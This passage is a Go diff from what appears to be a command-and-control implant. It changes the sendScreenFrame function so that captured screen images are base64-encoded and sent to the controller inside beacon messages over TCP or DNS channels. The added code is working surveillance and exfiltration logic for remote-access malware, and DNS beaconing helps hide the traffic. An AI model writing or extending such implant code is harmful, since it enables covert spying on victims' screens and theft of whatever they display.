@@ -658,10 +658,23 @@ func sendTaskResult(res TaskResult) {
 }
 
 func sendScreenFrame(data []byte) {
+	b64 := base64.StdEncoding.EncodeToString(data)
 	if Protocol == "tcp" || Protocol == "dns" {
+		req := BeaconRequest{
+			UUID: agentUUID,
+			Results: []TaskResult{{
+				Type:   "screen_frame",
+				Output: b64,
+			}},
+		}
+		body, _ := json.Marshal(req)
+		if Protocol == "tcp" {
+			sendTCPBeacon(body)
+		} else {
+			sendDNSBeacon(body)
+		}
 		return
 	}
-	b64 := base64.StdEncoding.EncodeToString(data)
 	req := struct {
 		UUID string `json:"uuid"`
 		Data string `json:"data"`
